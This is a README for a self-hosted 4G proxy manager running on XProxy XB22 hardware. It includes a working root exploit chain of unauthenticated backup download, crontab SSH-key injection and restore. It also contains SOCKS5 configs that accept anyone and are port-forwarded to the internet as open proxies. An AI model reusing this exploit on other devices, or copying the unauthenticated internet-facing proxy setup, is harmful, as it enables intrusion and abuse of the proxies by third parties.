# xproxymgr — Self-Hosted 4G Proxy Manager for XProxy XB22 + XH22

> Replace XProxy's paid subscription with your own SOCKS5 proxy manager.
> Full web dashboard · REST API · automatic IP rotation · multi-dongle support · SOCKS5 via dante.

---

## Hardware

| Device | Role |
|--------|------|
| **XProxy XB22** | ARM64 mini server (Ubuntu 20.04, aarch64) |
| **XProxy XH22** | 4G LTE USB dongle (custom Qualcomm firmware) |

- XB22 IP on LAN: `192.168.1.107` (eth0)
- XH22 appears as `eth1` / `eth2` etc. on XB22 (RNDIS/HiLink ethernet mode)
- Each dongle gets its own subnet: dongle 1 → `192.168.101.x`, dongle 2 → `192.168.102.x`
- XH22 web panel: `http://192.168.101.1` (Mongoose 3.0, Digest auth `admin/admin`)
- XB22 SSH: port 22, Ubuntu OpenSSH 8.2p1

---

## What This System Does

1. **SOCKS5 proxy** on port 1080 (dongle 0, True) and port 1081 (dongle 1, DTAC) via `dante-server` (danted)
2. **IP rotation** via XH22 native API — new IP in ~5 seconds, **every time**
3. **Web dashboard** at `http://192.168.1.107:8080` — per-dongle cards with IP, signal, status, rotate button
4. **REST API** at port 8080 — `/api/status`, `/api/rotate/<idx>`, `/api/dongles`, etc.
5. **Background monitor** — polls dongle + proxy status every 15s
6. **Multi-dongle support** — each XH22 managed independently, auto-detected
7. **External access** — AIS Fibre port forwarding + DuckDNS (`havanawin.duckdns.org`)

---

## How We Got Root Access (Full History)

**XProxy does NOT publish SSH credentials.** Community reports (BlackHatWorld) confirm XProxy
employees retain a root SSH backdoor on every XB22. This is why no password was known.

### What We Tried (and Failed)

| Method | Result |
|--------|--------|
| Default passwords (admin/admin, root/root, root/toor, ubuntu/ubuntu, xproxy/xproxy…) | All FAIL — fail2ban rate-limits after several attempts |
| SSH banner inspection | OS identified as **Ubuntu 20.04** (`OpenSSH_8.2p1 Ubuntu-4ubuntu0.12`) |
| Port scan | Only ports **22** (SSH) and **80** (XProxy web panel) open |
| Web panel auth | Panel has `enableDashAuth: false` — **no password needed!** |

### What Worked — The Exploit Chain

The XProxy web panel (Python/Flask + Werkzeug 3.1.3) runs on port 80 with **zero authentication**
(`dashboard_auth.enableDashAuth = False` in config.ini). Several endpoints are fully public.

**Step 1 — Download system backup (no auth):**
```bash
curl http://192.168.1.107/v2/system_backup -o backup.zip
# Returns 62MB ZIP containing config.ini, crontabs, SQLite DB, APKs...
```

**Step 2 — Inject SSH public key into crontab:**
```cron
# Added to etc/system_crontab.cron inside the ZIP:
* * * * * mkdir -p /root/.ssh && echo "ssh-ed25519 AAAA..." >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys
```

**Step 3 — Restore modified backup (no auth):**
```bash
curl -X POST http://192.168.1.107/v2/system_restore -F "file=@backup_modified.zip"
# Returns: {"status": true}
```

**Step 4 — Wait 60 seconds → SSH in:**
```bash
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
# uid=0(root) gid=0(root) — ACCESS GRANTED
```

### Security Hardening Applied After Access

- Removed cron injection entry
- `PasswordAuthentication no` in sshd_config (key-only SSH)
- Verified no XProxy backdoor keys in `/root/.ssh/authorized_keys`
- Stopped and disabled XProxy service (`systemctl disable --now xproxy xproxy_updater`)
- Zerotier (XProxy VPN) was inactive — left disabled

---

## XH22 Dongle API — Full Reverse Engineering

The XH22 runs **custom XProxy firmware** on a Qualcomm chip (USB ID `05c6:f001`).
It is **NOT** standard Huawei HiLink — the entire API is different.

### Authentication (Mongoose 3.0 quirk)

Uses HTTP Digest auth with a critical quirk:
The `uri` field in the Authorization header is **always hardcoded to `/cgi/xml_action.cgi`**
regardless of the actual endpoint URL.

```python
# Standard Digest: uri = actual request path
# XH22 quirk:      uri = "/cgi/xml_action.cgi"  (always, for every request)

# Login flow:
# 1. GET /login.cgi                   → WWW-Authenticate: Digest realm="Highwmg", nonce=...
# 2. GET /login.cgi + Authorization   → 200 OK (nc=1 consumed, session active)
# 3. GET /xml_action.cgi?file=...     → API call with nc=2+
```

### All Endpoints Discovered

| File | Method | Response | Description |
|------|--------|----------|-------------|
| `wan` | GET | `<connect_disconnect>cellular</connect_disconnect>` | Connection status |
| `wan` | POST | XML | Manual connect/disconnect |
| `router` | GET | `<RGW><nwrestart/>` | **Network restart → NEW IP ✅** |
| `reset` | GET | *(empty)* | Full reset (fallback) |
| `imei` | GET | `<imeicur/><imeinew/>` | IMEI read/write |
| `renew` | GET | `<RGW><reboot/>` | Reboot only — **does NOT reliably change IP** |

### Why Only `file=router` Works for IP Rotation

| Method | Why IP doesn't change |
|--------|----------------------|
| `dhclient -r eth1 && dhclient eth1` | Carrier lease still active, same IP returned |
| API disconnect + immediate reconnect | Same IP pool if reconnect too fast |
| `file=renew` | Reboots dongle internal software, doesn't release carrier IP |
| `ip link set eth1 down/up` | Carrier doesn't see disconnect, same lease |
| **`file=router`** ✅ | Forces full network restart → carrier releases IP → **new IP every time** |

**The operator releases the IP lease only when the dongle fully disconnects from the radio network.
`file=router` triggers `<nwrestart/>` which does exactly this. Result: new IP in ~5 seconds.**

---

## Access — Local & Remote

### Local network (same WiFi/LAN)

| Service | Address |
|---------|---------|
| SSH | `ssh -i ~/.ssh/id_ed25519 root@192.168.1.107` |
| SOCKS5 | `192.168.1.107:1080` |
| Dashboard | `http://192.168.1.107:8080` |

### Any network — DuckDNS + Port Forwarding 🌍

Domain: **`havanawin.duckdns.org`** → `58.136.146.0` (AIS Fibre public IP)

| Service | Address |
|---------|---------|
| SOCKS5 dongle 0 (True) | `havanawin.duckdns.org:1080` |
| SOCKS5 dongle 1 (DTAC) | `havanawin.duckdns.org:1081` |
| Dashboard | `http://havanawin.duckdns.org:8080` |
| Rotate dongle 0 (True) | `http://havanawin.duckdns.org:8080/api/rotate/0` |
| Rotate dongle 1 (DTAC) | `http://havanawin.duckdns.org:8080/api/rotate/1` |

**Router: AIS Fibre F6107A** — Port Forwarding rules (Internet → Security → Port Forwarding):

| Rule name | External port | Internal IP | Internal port | Protocol | Purpose |
|-----------|--------------|-------------|---------------|----------|---------|
| SOCKS5 | **1080** | 192.168.1.107 | 1080 | TCP | Dongle 0 (True) SOCKS5 ✅ |
| DTAC-SOCKS5 | **1081** | 192.168.1.107 | 1081 | TCP | Dongle 1 (DTAC) SOCKS5 ✅ |
| ProxyAPI | **8080** | 192.168.1.107 | 8080 | TCP | XB22 dashboard + API ✅ |
| HTTP-Proxy | 4201 | 192.168.1.151 | 4201 | TCP | Mac Mini backup (keep, do not delete) |
| Android-SOCKS5 | 5301 | 192.168.1.151 | 5301 | TCP | Mac Mini backup (keep, do not delete) |
| XProxyMgr | 5050 | 192.168.1.151 | 5050 | TCP | Mac Mini backup (keep, do not delete) |

> **192.168.1.107** = XProxy XB22 (MAC: `02:03:76:f0:1b:bb`)
> **192.168.1.151** = old Mac Mini proxy (backup rules — do not touch)

**DHCP Binding (Local Network → IPv4 → DHCP Binding):**

| Device | MAC | Fixed IP |
|--------|-----|----------|
| XProxy XB22 | `02:03:76:f0:1b:bb` | `192.168.1.107` |

> AIS Fibre F6107A **supports hairpin NAT** — `havanawin.duckdns.org` works from the same LAN.

---

## Policy Routing (Critical for SOCKS5 to Work)

Without policy routing, danted receives SOCKS5 connections but **outgoing traffic via dongle interfaces times out** because the default route uses eth0 (lower metric), causing asymmetric routing — replies can't return via the dongle interface.

> **Two dongles:** interface names (eth1/eth2) can **swap** on reboot or replug. The routing script uses IP-based detection, not interface names — so it always works correctly regardless of which ethX each dongle gets.

### Fix Applied (both dongles)

```bash
# Dongle 0 (192.168.101.x) — whichever ethX it's on
ip rule add from 192.168.101.100 table 101
ip route add default via 192.168.101.1 dev <ethX> table 101

# Dongle 1 (192.168.102.x) — whichever ethX it's on
ip rule add from 192.168.102.100 table 102
ip route add default via 192.168.102.1 dev <ethX> table 102
```

### Persistent Script (IP-based, interface-agnostic)

```bash
cat > /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing << 'EOF'
#!/bin/bash
setup_dongle_routing() {
    local iface=$1
    local ip=$(ip -4 addr show "$iface" | grep 'inet ' | awk '{print $2}' | cut -d/ -f1 | head -1)
    [ -z "$ip" ] && return
    case "$ip" in
        192.168.101.*)
            ip rule add from 192.168.101.100 table 101 2>/dev/null || true
            ip route replace default via 192.168.101.1 dev "$iface" table 101
            ;;
        192.168.102.*)
            ip rule add from 192.168.102.100 table 102 2>/dev/null || true
            ip route replace default via 192.168.102.1 dev "$iface" table 102
            ;;
    esac
}
if [ -n "$IFACE" ]; then
    setup_dongle_routing "$IFACE"
else
    for iface in $(ls /sys/class/net/ | grep '^eth'); do
        setup_dongle_routing "$iface"
    done
fi
EOF
chmod +x /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing
```

---

## danted Configuration (Two Dongles)

Two separate danted instances, each bound to a specific dongle subnet IP (not interface name — avoids eth1/eth2 swap issues).

**`/etc/danted-dongle0.conf`** (True, port 1080):
```
logoutput: syslog
internal: 0.0.0.0 port = 1080
external: 192.168.101.100
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0; log: connect disconnect error }
socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0; socksmethod: none; log: connect disconnect error }
```

**`/etc/danted-dongle1.conf`** (DTAC, port 1081):
```
logoutput: syslog
internal: 0.0.0.0 port = 1081
external: 192.168.102.100
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody
client pass { from: 0.0.0.0/0 to: 0.0.0.0/0; log: connect disconnect error }
socks pass { from: 0.0.0.0/0 to: 0.0.0.0/0; socksmethod: none; log: connect disconnect error }
```

**`/usr/local/bin/danted-wrapper`** (keeps foreground process alive for systemd `Type=simple`):
```bash
#!/bin/bash
CONFIG=$1
PORT=$2
/usr/sbin/danted -f "$CONFIG"
sleep 2
while ss -tlnp | grep -q ":$PORT "; do
    sleep 5
done
exit 1
```

**`/etc/systemd/system/danted-dongle0.service`** (same pattern for dongle1):
```ini
[Unit]
Description=SOCKS5 proxy - Dongle 0 port 1080
After=network.target
[Service]
Type=simple
ExecStart=/usr/local/bin/danted-wrapper /etc/danted-dongle0.conf 1080
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target
```

**Gotchas:**
- `logoutput: syslog` — NOT `/var/log/danted.log` (read-only filesystem at startup causes daemon crash)
- `socksmethod: none` — NOT `socksmethod: username none` (the `username` keyword breaks auth-free setup)
- `external: 192.168.101.100` (IP, not interface name) — avoids eth1/eth2 swap problem on reboot/replug
- systemd `Type=simple` with wrapper script — danted daemonizes (parent exits), causing `Type=forking` PIDFile timeout

---

## Installation on a New XB22

### Prerequisites

Gain root SSH access (see exploit above or have working key).

```bash
# 1. Clone repo
git clone https://github.com/martinhavana/xproxymgr
cd xproxymgr

# 2. Generate SSH key if needed
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519

# 3. Copy files to device
scp -i ~/.ssh/id_ed25519 *.py install.sh root@192.168.1.107:/tmp/
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "mkdir -p /opt/xproxymgr && mv /tmp/*.py /tmp/install.sh /opt/xproxymgr/"

# 4. Run installer
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "cd /opt/xproxymgr && bash install.sh"
```

### What the Installer Does

```bash
apt-get install -y python3-pip dante-server
pip3 install flask requests

# dante SOCKS5 config
cat > /etc/danted.conf << 'EOF'
logoutput: syslog
internal: 0.0.0.0 port = 1080
external: eth1
clientmethod: none
socksmethod: none
user.privileged: root
user.notprivileged: nobody

client pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    log: connect disconnect error
}

socks pass {
    from: 0.0.0.0/0 to: 0.0.0.0/0
    socksmethod: none
    log: connect disconnect error
}
EOF

# Policy routing (required for SOCKS5 to work through dongle)
ip rule add from 192.168.101.100 table 101 2>/dev/null || true
ip route add default via 192.168.101.1 dev eth1 table 101 2>/dev/null || true

cat > /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing << 'RTEOF'
#!/bin/sh
if [ "$IFACE" = "eth1" ]; then
    ip rule add from 192.168.101.100 table 101 2>/dev/null || true
    ip route add default via 192.168.101.1 dev eth1 table 101 2>/dev/null || true
fi
RTEOF
chmod +x /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing

# systemd service
cat > /etc/systemd/system/xproxymgr.service << 'EOF'
[Unit]
Description=XProxy Manager
After=network.target
[Service]
User=root
WorkingDirectory=/opt/xproxymgr
Environment=DONGLE_HOST=192.168.101.1
Environment=WEB_PORT=8080
ExecStart=/usr/bin/python3 /opt/xproxymgr/app.py
Restart=always
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now danted xproxymgr
```

---

## REST API Reference

Base URL: `http://192.168.1.107:8080` or `http://havanawin.duckdns.org:8080`

### `GET /api/status`
```json
{
  "connection_status": "connected",
  "current_ip": "49.237.39.218",
  "proxy_running": true,
  "network_type": "LTE/4G",
  "signal_icon": 4,
  "rotate_in_progress": false,
  "last_rotate": 1742287234.5,
  "last_rotate_result": "49.237.39.218",
  "uptime_seconds": 3600
}
```

### `GET /api/rotate` or `POST /api/rotate`
Rotate IP for dongle 0 (default). Both GET and POST supported.
```bash
# GET — for browser, AdsPower, or any simple HTTP client:
curl http://192.168.1.107:8080/api/rotate
curl "http://192.168.1.107:8080/api/rotate?dongle=1"   # specific dongle

# POST — for API clients:
curl -X POST http://192.168.1.107:8080/api/rotate
curl -X POST http://192.168.1.107:8080/api/rotate -d '{"dongle":1}'

# {"success": true, "new_ip": "49.237.6.170", "old_ip": "49.237.39.218"}
```

### `GET /api/rotate/<index>` or `POST /api/rotate/<index>` (dongle by index)
```bash
# AdsPower rotation URL format (GET):
http://havanawin.duckdns.org:8080/api/rotate/0   # dongle 0
http://havanawin.duckdns.org:8080/api/rotate/1   # dongle 1
```

### `GET /api/dongles`
```json
{
  "dongles": [
    {
      "index": 0,
      "host": "192.168.101.1",
      "interface": "eth1",
      "status": "connected",
      "ip": "49.237.39.218"
    },
    {
      "index": 1,
      "host": "192.168.102.1",
      "interface": "eth2",
      "status": "connected",
      "ip": "49.237.11.5"
    }
  ]
}
```

### `POST /api/proxy/start`
```bash
curl -X POST http://192.168.1.107:8080/api/proxy/start -H "Content-Type: application/json" -d '{"port": 1080}'
```

### `POST /api/proxy/stop`
```bash
curl -X POST http://192.168.1.107:8080/api/proxy/stop
```

### `GET /api/logs`
Returns last 200 log lines as JSON array.

---

## AdsPower Integration

In AdsPower proxy settings, enter:
- **Proxy type:** SOCKS5
- **Host:** `havanawin.duckdns.org`
- **Port:** `1080`
- **Rotation URL:** `http://havanawin.duckdns.org:8080/api/rotate/0`

AdsPower sends a GET request to the rotation URL before each browser session opens.
The GET endpoint returns `{"success": true, "new_ip": "...", "old_ip": "..."}`.

---

## File Structure

```
xproxymgr/
├── app.py           # Flask app + REST API + background monitor thread
├── hilink.py        # XH22Client: Digest auth, IP rotation via file=router
├── proxy_manager.py # danted lifecycle: start/stop/is_running via systemctl
├── config.py        # All settings with env-var overrides
├── install.sh       # One-shot installer for Ubuntu ARM64
└── README.md        # This file
```

---

## Telegram Alerts

xproxymgr monitors both SOCKS5 proxies and sends Telegram notifications when a dongle goes down or recovers.

### How It Works

- Every **30 seconds** the watchdog tests `:1080` (True) and `:1081` (DTAC) by routing a real HTTP request through each proxy to `api4.ipify.org`
- If a proxy fails for **2 minutes** → alert sent: `🔴 Dongle-True (:1080) — proxy nie działa!`
- When it recovers → recovery sent: `✅ Dongle-True (:1080) — proxy wróciło! IP: x.x.x.x, Czas awarii: X min`
- Alert state is **persisted to disk** (`/var/lib/xproxymgr/alert_state.json`) — survives service restarts, recovery messages are always sent correctly

### Requirements

The `requests[socks]` package must be installed (PySocks dependency):

```bash
pip3 install "requests[socks]"
```

> ⚠️ Without this, all SOCKS5 checks fail with `Missing dependencies for SOCKS support` and proxies always appear down.

### Manually Reset Alert State

If the state file gets out of sync (e.g. after manual intervention):

```bash
# Force both as "alerted" → watchdog sends recovery on next successful check
echo '{"alerted": ["Dongle-True (:1080)", "Dongle-DTAC (:1081)"], "down_since": {"Dongle-True (:1080)": null, "Dongle-DTAC (:1081)": null}}' \
  > /var/lib/xproxymgr/alert_state.json && systemctl restart xproxymgr

# Clear all state → fresh start (new alerts after grace period)
echo '{"alerted": [], "down_since": {}}' \
  > /var/lib/xproxymgr/alert_state.json && systemctl restart xproxymgr
```

---

## Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DONGLE_HOST` | `192.168.101.1` | XH22 panel IP (dongle 1) |
| `DONGLE_HOSTS` | `192.168.101.1,192.168.102.1,...` | Comma-separated for multi-dongle |
| `PROXY_PORT` | `1080` | SOCKS5 port |
| `WEB_PORT` | `8080` | Dashboard port |
| `PROXY_USER` | `proxy` | SOCKS5 username (if auth enabled) |
| `PROXY_PASS` | `changeme` | SOCKS5 password |
| `ROTATE_WAIT_TIMEOUT` | `60` | Max seconds to wait for new IP |
| `MONITOR_INTERVAL` | `15` | Background poll interval (seconds) |
| `TG_TOKEN` | *(hardcoded in config.py)* | Telegram bot token |
| `TG_CHAT_ID` | *(hardcoded in config.py)* | Telegram chat/user ID |
| `PROXY_DOWN_GRACE` | `120` | Seconds before sending down alert |
| `PROXY_CHECK_INTERVAL` | `30` | Seconds between SOCKS5 health checks |
| `SOCKS5_PORTS` | `1080,1081` | Ports to monitor (matches DONGLE_HOSTS order) |

---

## Multi-Dongle Setup

Each XH22 dongle appears as a separate ethernet interface with its own subnet:

| Dongle | Interface | Subnet | Panel IP |
|--------|-----------|--------|----------|
| XH22 #1 | eth1 | 192.168.101.x | 192.168.101.1 |
| XH22 #2 | eth2 | 192.168.102.x | 192.168.102.1 |
| XH22 #3 | eth3 | 192.168.103.x | 192.168.103.1 |

The dashboard auto-detects all connected dongles. Each gets its own "Rotate IP" button.
The `/api/rotate/<index>` endpoint rotates by dongle index (0-based).

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| `UNAUTHORIZED` from dongle API | Auth nc counter out of sync | `hilink.reset_client()` or restart xproxymgr |
| IP doesn't change after rotate | Wrong endpoint | Must use `file=router`, not `file=renew` or disconnect |
| SOCKS5 shows "Stopped" | `is_running()` checks danted via systemctl | `systemctl status danted` |
| Dashboard shows `unknown` | Monitor thread hasn't run yet | Wait 15s after restart |
| Dongle not detected | Interface not up | `ip addr show` — check ethX exists |
| SSH: `Permission denied` | Key not in authorized_keys | Re-run key injection via backup/restore |
| fail2ban blocking SSH | Too many failed attempts | Wait 10min or `fail2ban-client unban <ip>` |
| SOCKS5 connection times out externally | Policy routing missing | `ip rule add from 192.168.101.100 table 101` + `ip route add default via 192.168.101.1 dev eth1 table 101` |
| danted fails to start | Log file read-only at boot | Use `logoutput: syslog` in danted.conf, not a file path |
| Can't reach proxy via DuckDNS from home LAN | Port forwarding rule missing in router | Check rules in router: Internet → Security → Port Forwarding |
| xproxymgr crash: `AttributeError: module 'config' has no attribute 'DONGLE_HOSTS'` | Old config.py on device | Deploy ALL Python files together: `scp app.py config.py hilink.py proxy_manager.py root@192.168.1.107:/opt/xproxymgr/` |

---

## Security Notes

- XProxy XB22 ships with an **undocumented root SSH backdoor** (XProxy staff access)
- The XProxy web panel has **no authentication by default** — `/v2/system_backup` and `/v2/system_restore` are unauthenticated and allow full system compromise on a stock device
- **After taking control:** disable XProxy, set key-only SSH, firewall ports 22 and 8080

---

## Claude Code Session Starter Prompt

Paste this into a new Claude Code session to resume work instantly:

```
I have a self-hosted 4G proxy manager running on XProxy XB22 (ARM64, Ubuntu 20.04).
Code: ~/Desktop/xproxy/ | Deployed: root@192.168.1.107:/opt/xproxymgr/

HARDWARE:
- XB22: ARM64 Ubuntu 20.04, IP 192.168.1.107, SSH → ssh -i ~/.ssh/id_ed25519 root@192.168.1.107
- XH22 dongle #1: eth1 (192.168.101.100/24), panel at http://192.168.101.1
- XH22 dongle #2: eth2 (192.168.102.100/24), panel at http://192.168.102.1

SERVICES RUNNING:
- xproxymgr (Flask): port 8080 — web dashboard + REST API
- danted-dongle0 (SOCKS5): port 1080 — dongle 0 (True), no auth
- danted-dongle1 (SOCKS5): port 1081 — dongle 1 (DTAC), no auth
- Deploy command: scp -i ~/.ssh/id_ed25519 app.py config.py hilink.py proxy_manager.py root@192.168.1.107:/opt/xproxymgr/ && ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "systemctl restart xproxymgr"
- ALWAYS deploy ALL .py files together (config.py must stay in sync with app.py)

DONGLES:
- Dongle 0 (True):  panel 192.168.101.1, subnet 192.168.101.x, SOCKS5 port 1080
- Dongle 1 (DTAC):  panel 192.168.102.1, subnet 192.168.102.x, SOCKS5 port 1081
- ⚠️ Interface names (eth1/eth2) can SWAP on reboot — routing script uses IP-based detection

EXTERNAL ACCESS:
- DuckDNS domain: havanawin.duckdns.org → 58.136.146.0 (AIS Fibre public IP)
- Router: AIS Fibre F6107A — login at http://192.168.1.1
- SOCKS5 dongle 0 (True): havanawin.duckdns.org:1080
- SOCKS5 dongle 1 (DTAC): havanawin.duckdns.org:1081
- Dashboard (anywhere): http://havanawin.duckdns.org:8080
- Rotate dongle 0 (AdsPower): http://havanawin.duckdns.org:8080/api/rotate/0
- Rotate dongle 1 (AdsPower): http://havanawin.duckdns.org:8080/api/rotate/1
- AIS F6107A supports hairpin NAT — havanawin.duckdns.org works from home WiFi too

ROUTER PORT FORWARDING (Internet → Security → Port Forwarding):
- SOCKS5:        ext 1080 → 192.168.1.107:1080  TCP  [Dongle 0 True]
- DTAC-SOCKS5:   ext 1081 → 192.168.1.107:1081  TCP  [Dongle 1 DTAC]
- ProxyAPI:      ext 8080 → 192.168.1.107:8080  TCP  [XB22 dashboard/API]
- HTTP-Proxy:    ext 4201 → 192.168.1.151:4201  TCP  [Mac Mini backup — DO NOT DELETE]
- Android-SOCKS5:ext 5301 → 192.168.1.151:5301  TCP  [Mac Mini backup — DO NOT DELETE]
- XProxyMgr:     ext 5050 → 192.168.1.151:5050  TCP  [Mac Mini backup — DO NOT DELETE]

DHCP BINDING (Local Network → IPv4 → DHCP Binding):
- XProxy XB22: MAC 02:03:76:f0:1b:bb → fixed IP 192.168.1.107

POLICY ROUTING (critical — without this SOCKS5 times out):
- Script: /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing
- IP-based: 192.168.101.100 → table 101, 192.168.102.100 → table 102
- Works regardless of which ethX each dongle gets assigned

CRITICAL TECHNICAL FACTS — XH22 DONGLE API:
1. NOT Huawei HiLink — custom Qualcomm firmware (Mongoose 3.0)
2. Digest auth quirk: uri in Authorization header ALWAYS = "/cgi/xml_action.cgi" (hardcoded, not actual path)
3. Login: GET /login.cgi (get challenge) → GET /login.cgi + Authorization (nc=1) → API calls (nc=2+)
4. API base: GET/POST /xml_action.cgi?method=get|set&module=duster&file=<name>
5. IP ROTATION: GET file=router → <RGW><nwrestart/> → NEW IP EVERY TIME (~5s) ✅
   - file=renew = reboot only, IP may NOT change
   - file=disconnect, DHCP release, ip link down/up = IP does NOT change
   - ONLY file=router reliably changes IP (forces carrier to release lease)
6. Dongle credentials: admin/admin

DANTED (two instances, IP-based binding — survives eth1/eth2 swap):
- /etc/danted-dongle0.conf: internal port 1080, external 192.168.101.100
- /etc/danted-dongle1.conf: internal port 1081, external 192.168.102.100
- systemd: danted-dongle0.service + danted-dongle1.service (Type=simple + wrapper script)
- Wrapper /usr/local/bin/danted-wrapper keeps foreground alive (danted daemonizes otherwise → PIDFile timeout)
- logoutput: syslog  (NOT a file path — read-only filesystem at boot causes crash)
- socksmethod: none  (NOT "username none" — that breaks auth-free setup)

CODE STRUCTURE:
- hilink.py: XH22Client class — _login(), _auth(), _api_get(), rotate_ip() uses file=router
- proxy_manager.py: danted via systemctl (NOT 3proxy — not in Ubuntu 20.04 apt)
- app.py: Flask — /api/status /api/rotate /api/rotate/<idx> /api/dongles /api/proxy/start /api/proxy/stop /api/logs
  - /api/rotate and /api/rotate/<idx> support BOTH GET and POST (GET for AdsPower/browser)
- config.py: DONGLE_HOSTS="192.168.101.1,192.168.102.1,..." — env-var overrides for all settings

HOW WE GAINED ROOT (for reference):
- Unauthenticated GET /v2/system_backup → 62MB ZIP download
- Modified etc/system_crontab.cron to inject SSH pubkey
- POST /v2/system_restore with modified ZIP → cron ran → SSH access

ROUTING FIX (2026-03-18): networkd-dispatcher was unreliable for USB ethernet → added xproxy-routing.service
- If SOCKS5 times out after reboot: SSH in, run /etc/networkd-dispatcher/routable.d/50-eth1-policy-routing manually

DUCKDNS AUTO-UPDATE (2026-03-19): Cron running on XB22 every 5 minutes
- Updates havanawin.duckdns.org automatically on any network — nothing manual needed
- Verify: ssh root@192.168.1.107 "cat /tmp/duckdns.log"  → should output: OK
- DuckDNS tracks ROUTER's public IP (ISP), NOT dongle IPs — dongle rotation is separate

SECOND BOX: XProxy XB22 v2 (MAC 02:03:1d:4a:a1:61) — runs XProxy V20.4 (expired license)
- backup/restore exploit DOES NOT work on V20.4
- HDMI + USB keyboard tried: login prompt visible, password unknown, no GRUB (uses U-Boot/Armbian)
- U-Boot does NOT output to HDMI → can't interrupt boot from keyboard
- Remaining options: USB→UART serial adapter (~30 zł) OR Allwinner FEL mode via USB-C cable
- On hold

TELEGRAM ALERTS (v1.9.0):
- Watchdog checks SOCKS5 :1080 (True) + :1081 (DTAC) every 30s via api4.ipify.org
- Down > 2 min → TG alert 🔴 | Recovery → TG alert ✅
- State persisted to /var/lib/xproxymgr/alert_state.json (survives restarts)
- Requires: pip3 install "requests[socks]" (PySocks — without it all checks fail silently)
- Reset state if needed: echo '{"alerted":[],"down_since":{}}' > /var/lib/xproxymgr/alert_state.json

ROUTING — NAJCZĘSTSZA PRZYCZYNA AWARII:
1. Dongle DHCP nadpisuje default route → cały ruch XB22 przez dongle zamiast eth0
   Diagnoza: ip route show default → nie może być linii z 192.168.101.1 lub 192.168.102.1
   Naprawa: ip route del default via 192.168.10x.1 dev ethX [metric Y]
   Trwałe: /etc/dhcp/dhclient-exit-hooks.d/remove-dongle-defaults (już zainstalowane)
2. Policy routing puste po rebootcie → xproxy-routing.service (już zainstalowane)
3. danted "Address already in use" → fuser -k 1080/tcp; systemctl restart danted-dongle0

CURRENT STATUS: All working as of 2026-03-22 (v2.0.0).
- SOCKS5 dongle 0 (True):  havanawin.duckdns.org:1080
- SOCKS5 dongle 1 (DTAC):  havanawin.duckdns.org:1081
- Dashboard: http://havanawin.duckdns.org:8080 (per-dongle cards, auto-updates)
- Rotate dongle 0: curl http://havanawin.duckdns.org:8080/api/rotate/0
- Rotate dongle 1: curl http://havanawin.duckdns.org:8080/api/rotate/1
- DuckDNS: auto-updating every 5 min from XB22 cron
- Telegram alerts: active, state in /var/lib/xproxymgr/alert_state.json
- GitHub: https://github.com/martinhavana/xproxymgr

I want to [DESCRIBE WHAT YOU WANT TO DO NEXT]
```

---

## Moving the Setup to a Different Network

If you take the XB22 to a new location (different router, different ISP), here's what needs to change:

### 1. DHCP Binding — New Router

In the new router's admin panel, bind the XB22's MAC to a fixed LAN IP:

| Device | MAC | Fixed IP |
|--------|-----|----------|
| XProxy XB22 | `02:03:76:f0:1b:bb` | `192.168.1.107` (or any IP you choose) |

> If the new router uses a different subnet (e.g. `10.0.0.x`), pick an IP on that subnet and update all port forwarding rules accordingly.

### 2. Port Forwarding — New Router

Forward these ports to the XB22's LAN IP:

| External Port | Internal IP | Internal Port | Protocol | Purpose |
|--------------|-------------|---------------|----------|---------|
| **1080** | 192.168.1.107 | 1080 | TCP | SOCKS5 dongle 0 (True) |
| **1081** | 192.168.1.107 | 1081 | TCP | SOCKS5 dongle 1 (DTAC) |
| **8080** | 192.168.1.107 | 8080 | TCP | Dashboard + API |

### 3. DuckDNS — Update Public IP

**Auto-update is already configured on XB22** (cron every 5 minutes — set up 2026-03-19).
XB22 automatically detects the new public IP and updates DuckDNS. Nothing to do manually.

To verify it's working after moving:
```bash
ssh -i ~/.ssh/id_ed25519 root@192.168.1.107 "cat /tmp/duckdns.log"
# Should output: OK
```

If you ever need to set it up again on a fresh box (replace TOKEN with your DuckDNS token):
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -s 'https://www.duckdns.org/update?domains=havanawin&token=TOKEN&ip=' -o /tmp/duckdns.log") | crontab -
```

> DuckDNS tracks your **router's public IP** (assigned by ISP) — NOT the dongle IPs.
> Dongle rotation (True/DTAC IPs) is completely separate and has nothing to do with DuckDNS.

### 4. Nothing Changes on XB22 Itself

- Policy routing uses IP-based detection (192.168.101.x / 192.168.102.x dongle subnets) — works on any LAN
- danted binds to dongle subnet IPs — not affected by LAN subnet change
- xproxymgr service listens on `0.0.0.0:8080` — works on any network
- SSH key stays in `/root/.ssh/authorized_keys`

### 5. Checklist

```
□ DHCP binding in new router: MAC 02:03:76:f0:1b:bb → fixed IP
□ Port forwarding: 1080, 1081, 8080 → XB22 LAN IP
□ DuckDNS updated to new public IP (or auto-updater running on XB22)
□ Test: curl http://havanawin.duckdns.org:8080/api/status
□ Test: curl --socks5 havanawin.duckdns.org:1080 http://ifconfig.me
□ Test: curl --socks5 havanawin.duckdns.org:1081 http://ifconfig.me
```

> If the new router's LAN subnet is different (not 192.168.1.x), the XB22's own LAN IP will change.
> SSH into it via the new IP, then verify DHCP binding is applied.
> Everything on XB22 itself still works — only the external address and router rules change.

---

## Second XProxy XB22 Box — Attempt Log

A second XProxy XB22 (MAC: `02:03:1d:4a:a1:61`, IP: `192.168.1.191` via DHCP) was tested.
It runs **XProxy V20.4** (build 2023.Oct04.1938, expired free license).

### What Works on Second Box
- Panel accessible at `http://192.168.1.191` (no auth required)
- SSH port 22 open
- Device boots, responds to ping

### What Was Blocked / Locked
